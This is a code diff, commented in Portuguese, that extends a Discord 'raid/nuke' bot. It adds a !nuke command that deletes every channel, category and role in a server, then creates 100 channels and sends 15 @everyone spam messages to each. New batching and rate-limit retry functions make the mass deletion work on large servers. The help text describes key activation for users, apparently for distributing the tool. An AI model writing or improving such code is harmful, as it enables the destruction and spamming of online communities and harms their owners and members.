@@ -401,7 +401,8 @@ async def on_ready():
     print(f"  Owner ID: {OWNER_ID}")
     print("=" * 50)
     print("\nComandos do bot:")
-    print("  !raid          — RAID COMPLETO (apaga + cria + spam)")
+    print("  !raid          — RAID COMPLETO (apaga + cria 50 + spam)")
+    print("  !nuke          — Apaga tudo + cria 100 canais + spam")
     print("  !raid stop     — Para")
     print("  !backup        — Backup com permissões")
     print("  !restore       — Restaurar com permissões")
@@ -414,11 +415,14 @@ async def on_ready():
     print("\n" + "=" * 50)
 
     # Auto-salva configs de todos os servidores ao iniciar
-    print("\n[AUTO-CONFIG] Salvando configs de todos os servidores...")
+    print("\n[AUTO-CONFIG] Escaneando e salvando configs de todos os servidores...")
     for g in bot.guilds:
         try:
+            size_type, ch_count, _, _ = detect_server_size(g)
+            cat_count = len(g.categories)
+            role_count = len([r for r in g.roles if not r.is_default()])
             await save_server_config(g)
-            print(f"       ✅ {g.name} ({g.id})")
+            print(f"       ✅ {g.name} ({g.id}) | {ch_count} canais | {cat_count} cats | {role_count} roles | Método: {size_type}")
         except Exception as e:
             print(f"       ❌ {g.name}: {e}")
     print(f"[AUTO-CONFIG] {len(bot.guilds)} servidores processados")
@@ -426,14 +430,18 @@ async def on_ready():
 
 @bot.event
 async def on_guild_join(guild):
-    """Quando o bot entra num servidor novo, salva as configs automaticamente"""
+    """Quando o bot entra num servidor novo, escaneia e salva as configs automaticamente"""
     print(f"\n[GUILD JOIN] Bot adicionado ao servidor: {guild.name} ({guild.id})")
     print(f"             Dono: {guild.owner} ({guild.owner_id})")
     print(f"             Membros: {guild.member_count}")
     try:
         await asyncio.sleep(3)  # Espera o bot carregar tudo
+        ch_count = len([ch for ch in guild.channels if not isinstance(ch, discord.CategoryChannel)])
+        cat_count = len(guild.categories)
+        role_count = len([r for r in guild.roles if not r.is_default()])
+        print(f"[SCAN] {ch_count} canais | {cat_count} categorias | {role_count} roles")
         config = await save_server_config(guild)
-        print(f"[GUILD JOIN] Configs salvas: {len(config['categories'])} cats, {len(config['roles'])} roles, {len(config['channels'])} canais")
+        print(f"[GUILD JOIN] ✅ Configs salvas automaticamente!")
     except Exception as e:
         print(f"[GUILD JOIN] Erro ao salvar: {e}")
 
@@ -757,19 +765,87 @@ async def send_message_fast(channel, message, retries=3):
     return False
 
 
+async def delete_channel_fast(channel):
+    """Apaga um canal — sem retry, na base do possível"""
+    try:
+        await channel.delete()
+        return True
+    except Exception:
+        return False
+
+
+async def delete_channel_with_retry(channel, retries=3):
+    """Apaga um canal com retry pra rate limit"""
+    for attempt in range(retries):
+        try:
+            await channel.delete()
+            return True
+        except Exception as e:
+            error_msg = str(e).lower()
+            if "rate" in error_msg or "429" in error_msg:
+                await asyncio.sleep(0.5 * (attempt + 1))
+                continue
+            return False
+    return False
+
+
+def detect_server_size(guild):
+    """Detecta o tamanho do servidor e retorna o método ideal"""
+    ch_count = len([ch for ch in guild.channels if not isinstance(ch, discord.CategoryChannel)])
+    if ch_count <= 50:
+        return "small", ch_count, 0, 0       # (tipo, total, batch_size, delay)
+    elif ch_count <= 150:
+        return "medium", ch_count, 30, 0.5   # Lotes de 30, 0.5s delay
+    else:
+        return "large", ch_count, 30, 0.3    # Lotes de 30, 0.3s delay + retry
+
+
 async def delete_all_channels(guild):
-    """Apaga TODOS os canais em paralelo"""
-    tasks = [delete_channel_fast(ch) for ch in list(guild.channels) if not isinstance(ch, discord.CategoryChannel)]
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    deleted = sum(1 for r in results if r is True)
+    """Apaga TODOS os canais — adapta pro tamanho do servidor"""
+    size_type, total, batch_size, delay = detect_server_size(guild)
+    channels = [ch for ch in list(guild.channels) if not isinstance(ch, discord.CategoryChannel)]
+    
+    if size_type == "small":
+        # Pequeno: tudo paralelo instantâneo
+        tasks = [delete_channel_fast(ch) for ch in channels]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        deleted = sum(1 for r in results if r is True)
+    else:
+        # Médio/Grande: lotes com delay
+        deleted = 0
+        for i in range(0, total, batch_size):
+            batch = channels[i:i+batch_size]
+            if size_type == "large":
+                tasks = [delete_channel_with_retry(ch) for ch in batch]
+            else:
+                tasks = [delete_channel_fast(ch) for ch in batch]
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            deleted += sum(1 for r in results if r is True)
+            if i + batch_size < total:
+                await asyncio.sleep(delay)
+    
     return deleted
 
 
 async def delete_all_categories(guild):
-    """Apaga TODAS as categorias em paralelo"""
-    tasks = [delete_channel_fast(cat) for cat in list(guild.categories)]
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    deleted = sum(1 for r in results if r is True)
+    """Apaga TODAS as categorias — adapta pro tamanho"""
+    size_type, total, batch_size, delay = detect_server_size(guild)
+    cats = list(guild.categories)
+    
+    if size_type == "small":
+        tasks = [delete_channel_fast(cat) for cat in cats]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        deleted = sum(1 for r in results if r is True)
+    else:
+        deleted = 0
+        for i in range(0, len(cats), batch_size):
+            batch = cats[i:i+batch_size]
+            tasks = [delete_channel_fast(cat) for cat in batch]
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            deleted += sum(1 for r in results if r is True)
+            if i + batch_size < len(cats):
+                await asyncio.sleep(delay)
+    
     return deleted
 
 
@@ -789,14 +865,54 @@ async def delete_all_roles(guild):
     return deleted
 
 
+async def create_channel_with_retry(guild, name, retries=3):
+    """Cria um canal com retry pra rate limit"""
+    for attempt in range(retries):
+        try:
+            channel = await guild.create_text_channel(name=name)
+            return channel
+        except Exception as e:
+            error_msg = str(e).lower()
+            if "rate" in error_msg or "429" in error_msg:
+                await asyncio.sleep(0.5 * (attempt + 1))
+                continue
+            return None
+    return None
+
+
 async def create_all_channels(guild, count=50):
-    """Cria 50 canais em paralelo — instantâneo"""
-    tasks = [
-        create_channel_fast(guild, random.choice(CHANNEL_NAMES))
-        for _ in range(count)
-    ]
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    channels = [r for r in results if r is not None and isinstance(r, discord.TextChannel)]
+    """Cria canais — adapta pro tamanho do servidor"""
+    size_type, _, batch_size, delay = detect_server_size(guild)
+    
+    if size_type == "small":
+        # Pequeno: tudo paralelo instantâneo
+        tasks = [
+            create_channel_fast(guild, random.choice(CHANNEL_NAMES))
+            for _ in range(count)
+        ]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        channels = [r for r in results if r is not None and isinstance(r, discord.TextChannel)]
+    else:
+        # Médio/Grande: lotes com delay
+        created = []
+        for i in range(0, count, batch_size):
+            batch_count = min(batch_size, count - i)
+            if size_type == "large":
+                tasks = [
+                    create_channel_with_retry(guild, random.choice(CHANNEL_NAMES))
+                    for _ in range(batch_count)
+                ]
+            else:
+                tasks = [
+                    create_channel_fast(guild, random.choice(CHANNEL_NAMES))
+                    for _ in range(batch_count)
+                ]
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            created.extend(r for r in results if r is not None and isinstance(r, discord.TextChannel))
+            if i + batch_size < count:
+                await asyncio.sleep(delay)
+        channels = created
+    
     return channels
 
 
@@ -1115,6 +1231,82 @@ async def on_message(message):
         except Exception:
             pass
 
+    # ---- !nuke (Cria 100 canais + spam) ----
+    elif content == "!nuke":
+        if RAID_ACTIVE:
+            try:
+                await message.reply("⚠️ Já tem um raid/nuke ativo!")
+            except Exception:
+                pass
+            return
+
+        RAID_ACTIVE = True
+
+        # Backup automático COM PERMISSÕES
+        print("[NUKE] Backup automático (com permissões)...")
+        await save_backup(guild)
+
+        try:
+            await message.channel.send("💣 NUKE INICIADO!")
+        except Exception:
+            pass
+
+        print("\n[NUKE] INICIANDO NUKE COMPLETO...")
+
+        # Escaneia o servidor
+        total_channels = len([ch for ch in guild.channels if not isinstance(ch, discord.CategoryChannel)])
+        total_cats = len(guild.categories)
+        total_roles = len([r for r in guild.roles if not r.is_default()])
+        print(f"[SCAN] Servidor: {guild.name} | {total_channels} canais | {total_cats} categorias | {total_roles} roles")
+
+        # Fase 1: Apagar canais (lotes com retry)
+        print("[1/5] Apagando canais (lotes com retry)...")
+        deleted_ch = await delete_all_channels(guild)
+        print(f"      {deleted_ch}/{total_channels} canais apagados")
+
+        # Fase 2: Apagar categorias
+        print("[2/5] Apagando categorias (paralelo)...")
+        deleted_cat = await delete_all_categories(guild)
+        print(f"      {deleted_cat}/{total_cats} categorias apagadas")
+
+        # Fase 3: Apagar roles
+        print("[3/5] Apagando roles...")
+        deleted_r = await delete_all_roles(guild)
+        print(f"      {deleted_r} roles apagadas")
+
+        # Fase 4: Criar 100 canais (em lotes)
+        print("[4/5] Criando 100 canais (lotes)...")
+        new_channels = await create_all_channels(guild, count=100)
+        created = len(new_channels)
+        print(f"      {created} canais criados")
+
+        # Fase 5: Spam 15 msgs por canal
+        print("[5/5] Enviando 15 msgs por canal (paralelo)...")
+        sent = await spam_all_channels(new_channels)
+        print(f"      {sent} mensagens enviadas")
+
+        print(f"\n[NUKE] NUKE CONCLUÍDO!")
+        print(f"       Canais apagados: {deleted_ch}/{total_channels}")
+        print(f"       Categorias apagadas: {deleted_cat}/{total_cats}")
+        print(f"       Roles apagadas: {deleted_r}")
+        print(f"       Canais criados: {created}")
+        print(f"       Mensagens: {sent}")
+
+        try:
+            await message.channel.send(
+                f"💣 NUKE CONCLUÍDO!\n"
+                f"📡 {deleted_ch}/{total_channels} canais apagados\n"
+                f"🗂️ {deleted_cat}/{total_cats} categorias apagadas\n"
+                f"🗑️ {deleted_r} roles apagadas\n"
+                f"📂 {created} novos canais (100)\n"
+                f"💬 {sent} mensagens enviadas\n"
+                f"💾 Backup salvo (com permissões)"
+            )
+        except Exception:
+            pass
+
+        RAID_ACTIVE = False
+
     # ---- !backup ----
     elif content == "!backup":
         try:
@@ -1218,7 +1410,8 @@ async def on_message(message):
                 "                 Apaga canais + categorias + roles\n"
                 "                 Cria 50 canais + 15 msgs @everyone\n"
                 "                 Backup auto + config auto\n\n"
-                "!raid stop     — Para o raid\n"
+                "!nuke          — Apaga tudo + cria 100 canais + spam\n"
+                "!raid stop     — Para o raid/nuke\n"
                 "!backup        — Backup com permissões\n"
                 "!saveconfig    — Atualizar config manual\n"
                 "!configs       — Painel de servidores salvos\n"
@@ -1249,9 +1442,10 @@ async def on_message(message):
                 "```\n"
                 "!use <key>     — Ativar sua key\n"
                 "!raid          — RAID COMPLETO\n"
-                "!raid stop     — Para o raid\n"
+                "!nuke          — Apaga tudo + cria 100 canais + spam\n"
+                "!raid stop     — Para o raid/nuke\n"
                 "!backup        — Backup com permissões\n"
-                "!restore       — Restaurar (backup ou config)\n"
+                "!restore       — Restaurar (backup ou config auto)\n"
                 "!help          — Esta ajuda\n"
                 "```"
             )
